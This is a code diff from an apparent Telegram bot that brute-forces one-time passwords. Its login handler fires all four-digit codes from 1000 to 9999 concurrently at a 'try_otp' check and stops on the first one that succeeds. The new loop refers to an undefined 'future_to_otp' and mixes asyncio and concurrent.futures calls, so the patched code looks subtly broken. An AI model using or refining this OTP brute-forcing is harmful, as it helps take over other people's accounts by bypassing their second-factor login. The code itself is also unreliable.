@@ -121,14 +121,14 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
             loop = asyncio.get_event_loop()
             futures = [loop.run_in_executor(executor, try_otp, otp) for otp in range(1000, 10000)]
 
-            for future in asyncio.as_completed(futures):
-                if found_otp:
-                    executor.shutdown(wait=False)
-                    break
-                result = await future
-                if result:
-                    found_otp = result
-                    break
+            for future in concurrent.futures.as_completed(future_to_otp):
+                otp_result = future.result()  # Get the returned OTP
+                if otp_result:
+                   found_otp = otp_result  # Store the correct OTP
+                   executor.shutdown(wait=False)  # Stop further execution
+                   break
+
+
 
     await check_otp()
 
